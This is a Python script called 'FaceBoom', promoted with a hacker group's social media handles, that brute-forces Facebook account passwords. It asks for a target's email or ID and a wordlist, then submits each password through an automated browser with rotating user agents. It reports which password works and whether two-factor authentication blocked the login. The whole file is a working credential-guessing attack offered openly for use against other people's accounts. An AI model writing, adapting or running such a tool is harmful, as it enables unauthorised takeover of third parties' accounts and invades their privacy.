#!/usr/bin/python

import socket
import sys
import os
import re
import random
import time
import requests
import mechanize
import io


versionPath = os.path.join("core", "version.txt")

# Define errMsg function
def errMsg(msg):
    write(rd+"\n["+yl+"!"+rd+"] Error: "+yl+msg+rd+ " !!!\n"+wi)



try:import requests
except ImportError:
    errMsg("\033[1m[ requests ] module is missing")
    print(" [*] Please Use: 'pip install requests' to install it :)")
    sys.exit(1)
try:import mechanize
except ImportError:
    errMsg("[ mechanize ] module is missing")
    print("  [*] Please Use: 'pip install mechanize' to install it :)")
    sys.exit(1)
#slow print function
def sprint(str):
   for c in str +  '\n':
     sys.stdout.write(c)
     sys.stdout.flush()
     time.sleep(5./90)  

# Rest of your script...

def write(text):
    sys.stdout.write(text)
    sys.stdout.flush()

from optparse import OptionParser

wi = "\033[1;37m"  # White
rd = "\033[1;31m"  # Red
gr = "\033[1;32m"  # Green
yl = "\033[1;33m"  # Yellow

os.system("cls||clear")
print ("\n\n\n\n")
sprint("\033[96m\t   𝐓𝐨𝐨𝐥 𝐢𝐬 𝐬𝐭𝐚𝐫𝐭𝐢𝐧𝐠 𝐩𝐥𝐞𝐚𝐬𝐞 𝐰𝐚𝐢𝐭.......\n ")
time.sleep(5)
os.system("cls||clear")
#banner 
banner = """
╔═══╗╔═══╗╔═╗╔═╗╔═══╗╔═══╗╔═══╗╔═══╗╔╗╔═╗
║╔═╗║╚╗╔╗║╚╗╚╝╔╝║╔═╗║║╔═╗║║╔═╗║║╔═╗║║║║╔╝
║╚═╝║─║║║║─╚╗╔╝─║║─╚╝║╚═╝║║║─║║║║─╚╝║╚╝╝
║╔╗╔╝─║║║║─╔╝╚╗─║║─╔╗║╔╗╔╝║╚═╝║║║─╔╗║╔╗║
║║║╚╗╔╝╚╝║╔╝╔╗╚╗║╚═╝║║║║╚╗║╔═╗║║╚═╝║║║║╚╗
╚╝╚═╝╚═══╝╚═╝╚═╝╚═══╝╚╝╚═╝╚╝─╚╝╚═══╝╚╝╚═╝"""
print ("\t\t\033[1;32m\t", banner)
sprint ("\033[1;33m<========================\033[96m[ \033[1;31m@CYB3R_KING\033[96m ]\033[1;33m=========================>\033[96m")
print ("Telegram - \033[1;31mhttps://t.me/CYB3R_KING\n\033[96mYou tube - \033[1;31mhttp://YouTube.com/@CYB3R__KING\n\033[96mInstagram - \033[1;31mhttp://instagram.com/CYB3R_KING\n\033[96mOwner - \033[1;31m@SH4D0W_X\n\033[96mManager -\033[1;31m @CYB3R_SUMAN")
print ("\033[1;33m<================================================================>\n\n")
class FaceBoom(object):
    def __init__(self):
        self.br = mechanize.Browser()
        self.br.set_handle_robots(False)
        self.br._factory.is_html = True
        self.br.addheaders = [('User-agent', random.choice([
            'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/534.24 (KHTML, like Gecko) RockMelt/0.9.58.494 Chrome/11.0.696.71 Safari/534.24',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.47 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/15.0.874.54 Safari/535.2',
            'Opera/9.80 (J2ME/MIDP; Opera Mini/9.80 (S60; SymbOS; Opera Mobi/23.348; U; en) Presto/2.5.25 Version/10.54',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.12 Safari/535.11',
            'Mozilla/5.0 (Windows NT 5.1) AppleWebKit/535.6 (KHTML, like Gecko) Chrome/16.0.897.0 Safari/535.6',
            'Mozilla/5.0 (X11; Linux x86_64; rv:17.0) Gecko/20121202 Firefox/17.0 Iceweasel/17.0.1']))]

    @staticmethod
    def cnet():
        try:
            socket.create_connection((socket.gethostbyname("www.google.com"), 80), 2)
            return True
        except socket.error:
            pass
        return False

    def login(self, target, password):
        try:
            self.br.open("https://facebook.com")
            self.br.select_form(nr=0)
            self.br.form['email'] = target
            self.br.form['pass'] = password
            self.br.method = "POST"
            if self.br.submit().get_data().__contains__(b'home_icon'):
                return 1
            elif "checkpoint" in self.br.geturl():
                return 2
            return 0
        except (KeyboardInterrupt, EOFError):
            os.system("cls||clear")
            print(rd + "\n[" + yl + "!" + rd + "]" + yl + " exit" + rd + "..." + wi)
            sprint("\033[96mthanks for using this tool😇\n\t\033[1;31mHave a nice day\n\t\t\033[1;32mGood by👋")
            print ("\033[1;33m<========================\033[96m[ \033[1;31m@CYB3R_KING\033[96m ]\033[1;33m=========================>\033[96m")
            time.sleep(1.5)
            sys.exit(1)
        except Exception as e:
            print(rd + " Error: " + yl + str(e) + wi + "\n")
            time.sleep(0.60)
    def banner(self,target, wordlist):
       os.system("cls||clear")
       print ("\033[1;33m",banner)
       print ("\033[1;33m<========================\033[96m[ \033[1;31m@CYB3R_KING\033[96m ]\033[1;33m=========================>\033[96m")
       print ("Telegram - \033[1;31mhttps://t.me/CYB3R_KING\n\033[96mYou tube - \033[1;31mhttp://YouTube.com/@CYB3R__KING\n\033[96mInstagram - \033[1;31mhttp://instagram.com/CYB3R_KING\n\033[96mOwner - \033[1;31m@SH4D0W_X\n\033[96mManager -\033[1;31m @CYB3R_SUMAN\n\n\033[1;33m")
       print ("  \033[96m   ┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓")
       print(gr + """\t[>] Target      :> """ + wi + target + gr + """
\t[>] Wordlist    :> """ + yl + str(wordlist) + gr + """""" + wi)
       print ("  \033[96m   ┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛")
       print ("\033[1;33m<================================================================>\n\n")
    @staticmethod
    def updateFaceBoom():
        if not os.path.isfile(versionPath):
            errMsg("Unable to check for updates: please re-clone the script to fix this problem")
            sys.exit(1)
        write("[~] Checking for updates...\n")
        conn = httplib.HTTPSConnection("raw.githubusercontent.com")
        conn.request("GET", "https://github.com/CYB3R-KING/version.txt")
        repoVersion = conn.getresponse().read().strip().decode()
        with open(versionPath) as vf:
            currentVersion = vf.read().strip()
        if repoVersion == currentVersion:
            write("  [*] The script is up to date!\n")
        else:
            print("  [+] An update has been found ::: Updating... ")
            conn.request("GET", "/faceboom.py")
            newCode = conn.getresponse().read().strip().decode()
            with open("faceboom.py", "w") as faceBoomScript:
                faceBoomScript.write(newCode)
            with open(versionPath, "w") as ver:
                ver.write(repoVersion)
            write("  [+] Successfully updated :)\n")


def Main():
    faceboom = FaceBoom()

    target = input("\033[96mEnter target email or ID:\033[1;33m ")
    wordlist = input("\n\033[96mEnter wordlist file path:\033[1;33m ")

# Existing code
    if not faceboom.cnet():
        errMsg("Please Check Your Internet Connection")
        sys.exit(1)

    faceboom.banner(target, wordlist)
    loop = 1
    with io.open(wordlist, 'r', errors='replace') as f:
        passwords = f.readlines()
        for passwd in passwords:
            passwd = passwd.strip()
            if len(passwd) < 6:
                continue
            print(wi+"["+yl+str(loop)+wi+"] Trying Password[ {"+gr+str(passwd)+wi+"} ]")
            retCode = faceboom.login(target, passwd)
            if retCode:
                sys.stdout.write(wi + " --➣ Login" + gr + " Success")
                print ("\n\033[96m     ┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓")                                                     
                print ("\t \033[1;33mTarget  \033[1;31m--➣\033[1;32m",target)
                print (" \033[96m    ┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛")
                print ("\033[96m     ┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓")                                                            
                print ("\t\033[1;32m [\033[1;37m+\033[1;32m]\033[1;33m Password \033[96m--➣ \033[96m[\033[1;32m",passwd ,"\033[96m] \033[1;32mIs Correct :)")                                                        
                print ("  \033[96m   ┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛")
                if retCode == 2: print(
                    wi + "[" + yl + "!" + wi + "]" + yl + " Warning: This account use (" + rd + "2F Authentication" + yl + "):" + rd + " It's Locked" + yl + " !!!")
                break
            else:
                sys.stdout.write(yl + " --➣ login" + rd + " Failed\n")
                loop += 1
                print()  # Yeh line loop ke bahar add karein

        else:
            print(yl + "\n[" + rd + "!" + yl + "] Sorry: " + wi + "I Can't Find The Correct Password In [ " + yl + wordlist + wi + " ] " + rd + ":(" + yl + "!" + wi)
            print(gr + "[" + yl + "!" + gr + "]" + yl + " Please Try Another Wordlist. " + gr + ":)" + wi)
    sys.exit(1)


if __name__ == '__main__':
    Main()

